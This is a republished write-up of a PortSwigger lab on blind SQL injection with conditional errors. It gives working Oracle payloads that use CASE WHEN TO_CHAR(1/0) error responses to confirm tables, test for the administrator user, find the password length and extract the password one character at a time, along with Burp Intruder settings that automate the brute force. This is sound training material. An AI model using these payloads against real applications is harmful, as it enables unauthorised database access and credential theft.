# :game_die: Blind SQL injection with conditional errors(From PortSwigger) Lab #12

> **Original Source:** [Blind SQL injection with conditional errors(From PortSwigger) Lab #12](https://infosecwriteups.com/blind-sql-injection-with-conditional-errors-from-portswigger-lab-12-e8c106c1e133)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

### Aim: Exploit the blind sql and find the password of the administrator


### Lab Analysis


- Result of SQL query is not returned

- Application does not respond any differently based on whether the query return any rows

- If the SQL query causes an error, then the application returns a custom error message

### Confirming the vulnerability


```
' || (select '' from dual) || '
```


This payload gives 200 response since there exist table named dual.


```
' || (select '' from randomtable) || '
```


Since table *randomtable* doesnot exist it returns error message indicating table doesnot exist and concatinating (||) this error message with tracking id gives the overall 500 response.

### Checking if users table exist or not


```
' || (select '' from users where rownum = 1) || '
```


Above payload gives 200 response which indicates users table exist.


Note::


`‘ || (select ‘’ from users) || ‘
this is also a valid payload but in this case ,it breaks the system since it returns ‘’ for every row present in users table`

### Checking if administrator user exist or not in users table


```
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END
FROM users WHERE username='administrator')||'
```


Here `FROM users WHERE username=’administrator’` is first executed and if username=’administrator’ exist then `SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ‘’` is executed. Since administrator username exist `select case` is executed where `case (1=1)` is runed which is true so, `TO_CHAR(1/0)` gets executed and hence the response is 500.


Lets look at another example.


Since *unknownuser *username does not exist `select case` is not executed hence 200 response occur.

### Checking the length of password


```
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END
FROM users WHERE username='administrator'and length(password)>0)||'
```


Here `FROM users WHERE username=’administrator’and length(password)>0` is executed first, since username administrator exist and length of password is >0 `SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ‘’ END` is executed.
In select query` TO_CHAR(1/0)` is executed since the case 1=1 is true. Hence 500 response.


Lets look at another example


```
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END
FROM users WHERE username='administrator'and length(password)>50)||'
```


Here `FROM users WHERE username=’administrator’and length(password)>50` is executed first, since username administrator exist but length of password is not >50 `SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ‘’ END` doesnot get chance for execution. Hence 200 response.


## Get dollarboysushil’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Now we have payload to find the length of the password. Insted of manually entering the password length and examining the change is response. We can use Intruder to make our task easier.


In Intruder.
1. Click on `Clear`
2. Select the `50` field
3. Click on `Add`
4. Make sure the attack type is `Sniper`


- In `Payload` option

- Select payload type `Numbers`

- Select From `0`

- Select To `50`

- Select Steps `1`

- `Start Attack`


Here First sort by length by clicking on `length [1]` . We can see change in `length [2]`and `status code[3]` . Since we are getting 200 status code for length of password >20. So we can confirm the password length to be `20`.

>

If you are having trouble understanding how the password length is 20. review the theory from finding the length of password section above.


### Brute forcing the password


```
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END
FROM users WHERE username='administrator' and substr(password,1,1) ='a') ||'
```


In this payload substr(password,1,1) = ‘a’ works as `SUBSTRING(*string*, *start*, *length*)` . We are comparing the 1st character of password . In this case we are comparing it with ‘a’. If the 1st character is ‘a’ then `SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ‘’ END` gets executed, inside case query since`1=1` `To_char(1/0)` gets executed which return error. Hence the status would be `500`.


Since the status code is `200` we can confirm the 1st character is not ‘a’.


Lets use intruder again to manually change the `start `field of `substr `function and change the 1st character we are comparing `‘a’` in this case.


- Select the `start` field of `substr` function

- Click on `Add`

- Select the `‘a’ `field

- Click on `Add`

- Set Attack type as `Cluster bomb`


Go to payload section


- Payload set `1`

- Payload type `Numbers`

- From `1`

- To `20`

- Step `1`

- `Start Attack`


- Payload set 2

- Payload type `Brute Forcer`

- Min length `1`

- Max length`1`

- `Start Attack`


Here Click on Status `1` to sort on basis of status code.
We can see the 500 code which is what we are looking for
Now arrange all the Payload2 character which is of 500 status code .
In this case Password = `8b5j5yhyqq6ikzl0i7sl`


Now lets login to complete the level.


## Congrats

---

*Originally published on [Medium](https://infosecwriteups.com/blind-sql-injection-with-conditional-errors-from-portswigger-lab-12-e8c106c1e133). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
